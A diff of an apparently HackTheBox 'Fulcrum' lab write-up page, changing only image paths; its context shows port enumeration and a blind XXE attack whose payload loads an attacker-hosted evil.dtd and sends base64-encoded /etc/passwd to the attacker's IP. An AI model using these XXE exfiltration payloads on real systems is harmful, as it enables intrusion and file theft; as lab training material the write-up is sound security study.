@@ -58,7 +58,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 19.53 seconds
-</code></pre><ul><li>Port <code>4</code></li></ul><p><img src=./images/1.png></p><pre tabindex=0><code>└─$ feroxbuster -u http://10.10.10.62:4 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k -x php
+</code></pre><ul><li>Port <code>4</code></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/fulcrum/images/1.png></p><pre tabindex=0><code>└─$ feroxbuster -u http://10.10.10.62:4 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k -x php
 
  ___  ___  __   __     __      __         __   ___
 |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
@@ -84,7 +84,7 @@ by Ben &#34;epi&#34; Risher 🤓                 ver: 2.10.0
 200      GET        1l        6w      110c http://10.10.10.62:4/
 200      GET        1l        6w       54c http://10.10.10.62:4/upload.php
 200      GET       13l       27w      312c http://10.10.10.62:4/home.php
-</code></pre><ul><li>Port <code>80</code></li></ul><p><img src=./images/2.png></p><pre tabindex=0><code>└─$ feroxbuster -u http://10.10.10.62 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k -x asp,aspx 
+</code></pre><ul><li>Port <code>80</code></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/fulcrum/images/2.png></p><pre tabindex=0><code>└─$ feroxbuster -u http://10.10.10.62 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k -x asp,aspx 
 
  ___  ___  __   __     __      __         __   ___
 |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
@@ -107,7 +107,7 @@ by Ben &#34;epi&#34; Risher 🤓                 ver: 2.10.0
  🏁  Press [ENTER] to use the Scan Management Menu™
 ──────────────────────────────────────────────────
 200      GET      108l      372w     5252c http://10.10.10.62/
-</code></pre><ul><li>Port <code>88</code></li></ul><p><img src=./images/3.png></p><ul><li>Port <code>9999</code></li></ul><p><img src=./images/4.png></p><ul><li>Port <code>56423</code></li></ul><p><img src=./images/5.png></p><pre tabindex=0><code>└─$ feroxbuster -u http://10.10.10.62:56423 -m GET,POST,PUT,DELETE
+</code></pre><ul><li>Port <code>88</code></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/fulcrum/images/3.png></p><ul><li>Port <code>9999</code></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/fulcrum/images/4.png></p><ul><li>Port <code>56423</code></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/fulcrum/images/5.png></p><pre tabindex=0><code>└─$ feroxbuster -u http://10.10.10.62:56423 -m GET,POST,PUT,DELETE
 
  ___  ___  __   __     __      __         __   ___
 |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
@@ -131,15 +131,15 @@ by Ben &#34;epi&#34; Risher 🤓                 ver: 2.10.0
 405   DELETE        7l       12w      166c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
 200      GET        2l        1w       31c http://10.10.10.62:56423/
 200     POST        2l        1w       31c http://10.10.10.62:56423/
-</code></pre><h2 id=foothold>Foothold</h2><ul><li>Nothing interesting<ul><li>We have a port <code>API</code> on port <code>56423</code><ul><li>It looks like it&rsquo;s a custom <code>API</code></li></ul></li><li>We can play around with different payloads</li></ul></li></ul><p><img src=./images/6.png></p><ul><li>Was stuck here for a while<ul><li>After receiving a hint about <code>xml</code>, I tried a <code>xml</code> payloads</li><li>Sending <code>Ping</code> now, we receive <code>Ping</code> back</li></ul></li></ul><p><img src=./images/7.png></p><ul><li>So let&rsquo;s try <code>XXE</code><ul><li>We could try one of the payloads<ul><li><a href=https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity target=_blank rel=noopener>https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity</a></li><li><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#blind-xxe target=_blank rel=noopener>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#blind-xxe</a></li></ul></li><li>We don&rsquo;t receive any output, so we should try <code>blind xxe</code></li></ul></li></ul><pre tabindex=0><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+</code></pre><h2 id=foothold>Foothold</h2><ul><li>Nothing interesting<ul><li>We have a port <code>API</code> on port <code>56423</code><ul><li>It looks like it&rsquo;s a custom <code>API</code></li></ul></li><li>We can play around with different payloads</li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/fulcrum/images/6.png></p><ul><li>Was stuck here for a while<ul><li>After receiving a hint about <code>xml</code>, I tried a <code>xml</code> payloads</li><li>Sending <code>Ping</code> now, we receive <code>Ping</code> back</li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/fulcrum/images/7.png></p><ul><li>So let&rsquo;s try <code>XXE</code><ul><li>We could try one of the payloads<ul><li><a href=https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity target=_blank rel=noopener>https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity</a></li><li><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#blind-xxe target=_blank rel=noopener>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#blind-xxe</a></li></ul></li><li>We don&rsquo;t receive any output, so we should try <code>blind xxe</code></li></ul></li></ul><pre tabindex=0><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
 &lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &#34;http://10.10.16.9/anything&#34;&gt; %xxe;]&gt;
-</code></pre><ul><li>And we have a hit</li></ul><p><img src=./images/9.png></p><p><img src=./images/8.png></p><ul><li>Let&rsquo;s try exfil<ul><li><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-oob-attack-yunusov-2013 target=_blank rel=noopener>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-oob-attack-yunusov-2013</a></li><li>The payload that we will send</li></ul></li></ul><pre tabindex=0><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
+</code></pre><ul><li>And we have a hit</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/fulcrum/images/9.png></p><p><img src=/posts/cybersecurity/hackthebox/machines/linux/fulcrum/images/8.png></p><ul><li>Let&rsquo;s try exfil<ul><li><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-oob-attack-yunusov-2013 target=_blank rel=noopener>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-oob-attack-yunusov-2013</a></li><li>The payload that we will send</li></ul></li></ul><pre tabindex=0><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
 &lt;!DOCTYPE data SYSTEM &#34;http://10.10.16.9/evil.dtd&#34;&gt;
 &lt;data&gt;&amp;send;&lt;/data&gt;
 </code></pre><ul><li>The <code>.dtd</code> file we host on our server</li></ul><pre tabindex=0><code>&lt;!ENTITY % file SYSTEM &#34;php://filter/convert.base64-encode/resource=/etc/passwd&#34;&gt;
 &lt;!ENTITY % all &#34;&lt;!ENTITY send SYSTEM &#39;http://10.10.16.9/?%file;&#39;&gt;&#34;&gt;
 %all;
-</code></pre><ul><li>And we have a hit</li></ul><p><img src=./images/10.png></p><p><img src=./images/11.png></p><ul><li>The source code</li></ul><pre tabindex=0><code>&lt;?php
+</code></pre><ul><li>And we have a hit</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/fulcrum/images/10.png></p><p><img src=/posts/cybersecurity/hackthebox/machines/linux/fulcrum/images/11.png></p><ul><li>The source code</li></ul><pre tabindex=0><code>&lt;?php
         header(&#39;Content-Type:application/json;charset=utf-8&#39;);
         header(&#39;Server: Fulcrum-API Beta&#39;);
         libxml_disable_entity_loader (false);
